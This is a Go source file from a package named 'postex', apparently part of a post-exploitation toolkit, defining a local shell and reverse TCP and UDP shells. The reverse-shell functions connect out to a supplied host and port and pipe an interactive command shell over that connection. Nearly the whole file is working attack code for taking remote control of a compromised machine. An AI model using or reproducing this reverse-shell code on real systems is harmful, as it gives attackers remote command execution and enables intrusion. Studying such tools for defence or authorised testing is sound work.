package postex
//Contains functions for spawning various different types of shell, local and remote.

import "fmt"
import "os"
import "strings"
import "net"
import "strconv"

/*
* LocalShell(filepath string)
* Spawns a basic local shell connected to STDIN and STDOUT.
*/

func LocalShell(filepath string) {
	//spawn the shell
	var session *shell
	var err error
	session,err = spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			fmt.Printf(session.recv())
		}
	}(session)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		os.Stdin.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := strings.TrimRight(string(msg), "\r\n")
		session.send(string_msg)
	}
}

/*
* ReverseTCPShell(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the net package.
*/

func ReverseTCPShell(filepath string, host string, port int) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	target_addr,err := net.ResolveTCPAddr("tcp4", addr_string)
	if err != nil {
		fmt.Println("Error resolving TCP address.")
		fmt.Println(string(err.Error()))
		return
	}
	target_conn,err := net.DialTCP("tcp4", nil, target_addr)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		r,_ := target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := fmt.Sprintf("%s", msg[0:r])
		string_msg = strings.TrimRight(string_msg, "\r\n")
		string_msg += "\n"
		session.send(string_msg)
	}
}

/*
* ReverseUDPShell(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the net package.
*/

func ReverseUDPShell(filepath string, host string, port int) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	target_addr,err := net.ResolveUDPAddr("udp4", addr_string)
	if err != nil {
		fmt.Println("Error resolving UDP address.")
		fmt.Println(string(err.Error()))
		return
	}
	target_conn,err := net.DialUDP("udp4", nil, target_addr)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	target_conn.Write([]byte("\n")) //you must send some initial data in order to establish the reverse connection over UDP
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		r,_ := target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := fmt.Sprintf("%s", msg[0:r])
		string_msg = strings.TrimRight(string_msg, "\r\n")
		string_msg += "\n"
		session.send(string_msg)
	}
}

